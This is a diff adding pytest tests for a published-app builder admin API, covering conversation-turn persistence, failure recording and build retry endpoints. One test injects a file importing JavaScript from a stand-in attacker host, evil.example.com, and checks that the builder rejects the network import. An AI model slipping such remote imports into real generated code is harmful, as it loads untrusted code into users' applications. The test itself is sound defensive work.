@@ -1,8 +1,11 @@
 import json
+from uuid import UUID
 
 import pytest
+from sqlalchemy import select
 
 from app.api.routers.published_apps_admin import BUILDER_MAX_FILE_BYTES
+from app.db.postgres.models.published_apps import BuilderConversationTurnStatus, PublishedAppBuilderConversationTurn
 
 from ._helpers import admin_headers, seed_admin_tenant_and_agent
 
@@ -400,3 +403,167 @@ async def test_builder_chat_stream_returns_rich_event_envelopes(client, db_sessi
         if event.get("event"):
             assert event.get("request_id")
             assert event.get("stage")
+
+
+@pytest.mark.asyncio
+async def test_builder_chat_stream_persists_conversation_turn_for_replay(client, db_session):
+    tenant, user, org_unit, agent = await seed_admin_tenant_and_agent(db_session)
+    headers = admin_headers(str(user.id), str(tenant.id), str(org_unit.id))
+    create_resp = await client.post(
+        "/admin/apps",
+        headers=headers,
+        json={
+            "name": "Builder Conversation Persistence App",
+            "agent_id": str(agent.id),
+            "template_key": "chat-classic",
+            "auth_enabled": True,
+            "auth_providers": ["password"],
+        },
+    )
+    assert create_resp.status_code == 200
+    app_id = create_resp.json()["id"]
+
+    state_resp = await client.get(f"/admin/apps/{app_id}/builder/state", headers=headers)
+    assert state_resp.status_code == 200
+    draft_revision_id = state_resp.json()["current_draft_revision"]["id"]
+
+    stream_resp = await client.post(
+        f"/admin/apps/{app_id}/builder/chat/stream",
+        headers=headers,
+        json={
+            "input": "Make the header title bold",
+            "base_revision_id": draft_revision_id,
+        },
+    )
+    assert stream_resp.status_code == 200
+    events = _parse_sse_events(stream_resp.text)
+    patch_event = next(item for item in events if item.get("event") == "patch_ops")
+    request_id = patch_event["request_id"]
+
+    persisted = await db_session.scalar(
+        select(PublishedAppBuilderConversationTurn).where(
+            PublishedAppBuilderConversationTurn.request_id == request_id
+        )
+    )
+    assert persisted is not None
+    assert str(persisted.published_app_id) == app_id
+    assert str(persisted.revision_id) == draft_revision_id
+    assert persisted.status == BuilderConversationTurnStatus.succeeded
+    assert persisted.user_prompt == "Make the header title bold"
+    assert persisted.assistant_summary
+    assert isinstance(persisted.patch_operations, list)
+    assert persisted.patch_operations
+    assert persisted.failure_code is None
+
+    list_resp = await client.get(f"/admin/apps/{app_id}/builder/conversations?limit=10", headers=headers)
+    assert list_resp.status_code == 200
+    list_payload = list_resp.json()
+    assert isinstance(list_payload, list)
+    assert list_payload
+    assert list_payload[0]["request_id"] == request_id
+    assert list_payload[0]["status"] == "succeeded"
+
+
+@pytest.mark.asyncio
+async def test_builder_chat_stream_persists_failure_turn(client, db_session, monkeypatch):
+    tenant, user, org_unit, agent = await seed_admin_tenant_and_agent(db_session)
+    headers = admin_headers(str(user.id), str(tenant.id), str(org_unit.id))
+    create_resp = await client.post(
+        "/admin/apps",
+        headers=headers,
+        json={
+            "name": "Builder Conversation Failure App",
+            "agent_id": str(agent.id),
+            "template_key": "chat-classic",
+            "auth_enabled": True,
+            "auth_providers": ["password"],
+        },
+    )
+    assert create_resp.status_code == 200
+    app_id = create_resp.json()["id"]
+
+    state_resp = await client.get(f"/admin/apps/{app_id}/builder/state", headers=headers)
+    assert state_resp.status_code == 200
+    draft_revision_id = state_resp.json()["current_draft_revision"]["id"]
+
+    def _invalid_patch(_prompt: str, _files: dict[str, str]) -> tuple[list[dict[str, str]], str]:
+        return (
+            [
+                {
+                    "op": "upsert_file",
+                    "path": "src/Broken.tsx",
+                    "content": 'import x from "https://evil.example.com/x.js";\nexport default x;\n',
+                }
+            ],
+            "inject invalid network import",
+        )
+
+    monkeypatch.setattr("app.api.routers.published_apps_admin._build_builder_patch_from_prompt", _invalid_patch)
+
+    stream_resp = await client.post(
+        f"/admin/apps/{app_id}/builder/chat/stream",
+        headers=headers,
+        json={
+            "input": "Break the project on purpose",
+            "base_revision_id": draft_revision_id,
+        },
+    )
+    assert stream_resp.status_code == 422
+    detail = stream_resp.json()["detail"]
+    assert detail["code"] == "BUILDER_COMPILE_FAILED"
+
+    persisted = await db_session.scalar(
+        select(PublishedAppBuilderConversationTurn)
+        .where(PublishedAppBuilderConversationTurn.published_app_id == UUID(app_id))
+        .order_by(PublishedAppBuilderConversationTurn.created_at.desc())
+    )
+    assert persisted is not None
+    assert persisted.status == BuilderConversationTurnStatus.failed
+    assert persisted.failure_code == "BUILDER_COMPILE_FAILED"
+    assert any("Network import is not allowed" in item["message"] for item in (persisted.diagnostics or []))
+
+
+@pytest.mark.asyncio
+async def test_builder_revision_build_status_and_retry_endpoints(client, db_session):
+    tenant, user, org_unit, agent = await seed_admin_tenant_and_agent(db_session)
+    headers = admin_headers(str(user.id), str(tenant.id), str(org_unit.id))
+
+    create_resp = await client.post(
+        "/admin/apps",
+        headers=headers,
+        json={
+            "name": "Build Status App",
+            "agent_id": str(agent.id),
+            "template_key": "chat-classic",
+            "auth_enabled": True,
+            "auth_providers": ["password"],
+        },
+    )
+    assert create_resp.status_code == 200
+    app_id = create_resp.json()["id"]
+
+    state_resp = await client.get(f"/admin/apps/{app_id}/builder/state", headers=headers)
+    assert state_resp.status_code == 200
+    draft_revision_id = state_resp.json()["current_draft_revision"]["id"]
+
+    build_resp = await client.get(
+        f"/admin/apps/{app_id}/builder/revisions/{draft_revision_id}/build",
+        headers=headers,
+    )
+    assert build_resp.status_code == 200
+    build_payload = build_resp.json()
+    assert build_payload["revision_id"] == draft_revision_id
+    assert build_payload["build_status"] == "queued"
+    assert build_payload["build_seq"] == 1
+    assert build_payload["template_runtime"] == "vite_static"
+
+    retry_resp = await client.post(
+        f"/admin/apps/{app_id}/builder/revisions/{draft_revision_id}/build/retry",
+        headers=headers,
+        json={},
+    )
+    assert retry_resp.status_code == 200
+    retry_payload = retry_resp.json()
+    assert retry_payload["revision_id"] == draft_revision_id
+    assert retry_payload["build_status"] == "queued"
+    assert retry_payload["build_seq"] == 2
